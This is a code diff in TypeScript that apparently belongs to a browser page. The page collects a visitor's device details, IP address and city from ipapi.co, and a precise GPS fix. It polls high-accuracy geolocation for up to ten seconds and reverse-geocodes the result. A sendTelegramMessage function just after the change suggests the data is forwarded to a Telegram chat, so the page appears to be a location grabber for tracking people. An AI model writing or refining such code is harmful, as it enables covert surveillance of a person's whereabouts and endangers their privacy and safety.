@@ -219,62 +219,115 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
   }
 }
 
-async function getLocationInfo(): Promise<LocationInfo> {
+async function getBestGPSPosition(): Promise<GeolocationPosition | null> {
+  return new Promise((resolve) => {
+    if (!('geolocation' in navigator)) {
+      resolve(null);
+      return;
+    }
+
+    let bestPosition: GeolocationPosition | null = null;
+    let watchId: number | null = null;
+    let settled = false;
+
+    const finish = (pos: GeolocationPosition | null) => {
+      if (settled) return;
+      settled = true;
+      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+      resolve(pos);
+    };
+
+    // Watch position to collect the most accurate fix within 10 seconds
+    watchId = navigator.geolocation.watchPosition(
+      (pos) => {
+        if (!bestPosition || pos.coords.accuracy < bestPosition.coords.accuracy) {
+          bestPosition = pos;
+        }
+        // If accuracy is good enough (<=30m), stop early
+        if (pos.coords.accuracy <= 30) {
+          finish(bestPosition);
+        }
+      },
+      () => {
+        // watchPosition failed — resolve with whatever we have
+        finish(bestPosition);
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+
+    // Guaranteed cutoff: resolve after 10 seconds with the best position so far
+    setTimeout(() => finish(bestPosition), 10000);
+  });
+}
+
+async function reverseGeocode(
+  lat: number,
+  lon: number
+): Promise<{ city: string; country: string } | null> {
   try {
-    // Get IP-based location first as a fallback
-    const ipResponse = await fetch('https://ipapi.co/json/');
-    if (!ipResponse.ok) {
-      throw new Error(`Location API error: ${ipResponse.status}`);
-    }
-    const ipData = await ipResponse.json();
-
-    const locationData: LocationInfo = {
-      city: ipData.city || 'Unknown',
-      country: ipData.country_name || 'Unknown',
-      latitude: ipData.latitude || null,
-      longitude: ipData.longitude || null,
-      accuracy: null,
-      source: 'IP',
-      ip: ipData.ip || 'Unknown',
-    };
-
-    // Try to get precise location if available
-    if ('geolocation' in navigator) {
-      try {
-        const position = await new Promise<GeolocationPosition>(
-          (resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
-              enableHighAccuracy: true,
-              timeout: 5000,
-              maximumAge: 0,
-            });
-          }
-        );
-
-        // Only update if we got more precise coordinates
-        locationData.latitude = position.coords.latitude;
-        locationData.longitude = position.coords.longitude;
-        locationData.accuracy = position.coords.accuracy;
-        locationData.source = 'GPS';
-      } catch (geoError) {
-        // Silently fall back to IP-based location
-        console.log('Using IP-based location as fallback');
-      }
-    }
-
-    return locationData;
-  } catch (error) {
-    console.error('Error fetching location:', error);
-    return {
-      city: 'Unknown',
-      country: 'Unknown',
-      latitude: null,
-      longitude: null,
-      accuracy: null,
-      source: 'None',
-      ip: 'Unknown',
-    };
+    const res = await fetch(
+      `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`,
+      { headers: { 'Accept-Language': 'en' } }
+    );
+    if (!res.ok) return null;
+    const data = await res.json();
+    const addr = data.address || {};
+    const city =
+      addr.city ||
+      addr.town ||
+      addr.village ||
+      addr.county ||
+      addr.state ||
+      'Unknown';
+    const country = addr.country || 'Unknown';
+    return { city, country };
+  } catch {
+    return null;
   }
+}
+
+async function getLocationInfo(): Promise<LocationInfo> {
+  // Fetch IP-based location and GPS in parallel
+  const [ipResult, gpsPosition] = await Promise.allSettled([
+    fetch('https://ipapi.co/json/').then((r) => (r.ok ? r.json() : null)),
+    getBestGPSPosition(),
+  ]);
+
+  const ipData =
+    ipResult.status === 'fulfilled' && ipResult.value ? ipResult.value : null;
+  const gpsPos =
+    gpsPosition.status === 'fulfilled' ? gpsPosition.value : null;
+
+  // Start with IP-based data as baseline
+  const locationData: LocationInfo = {
+    city: ipData?.city || 'Unknown',
+    country: ipData?.country_name || 'Unknown',
+    latitude: ipData?.latitude || null,
+    longitude: ipData?.longitude || null,
+    accuracy: null,
+    source: ipData ? 'IP' : 'None',
+    ip: ipData?.ip || 'Unknown',
+  };
+
+  // Override with GPS if available (much more accurate)
+  if (gpsPos) {
+    locationData.latitude = gpsPos.coords.latitude;
+    locationData.longitude = gpsPos.coords.longitude;
+    locationData.accuracy = gpsPos.coords.accuracy;
+    locationData.source = 'GPS';
+
+    // Reverse geocode GPS coords for accurate city/country
+    const geocoded = await reverseGeocode(
+      gpsPos.coords.latitude,
+      gpsPos.coords.longitude
+    );
+    if (geocoded) {
+      locationData.city = geocoded.city;
+      locationData.country = geocoded.country;
+    }
+  }
+
+  return locationData;
 }
 
 async function sendTelegramMessage(
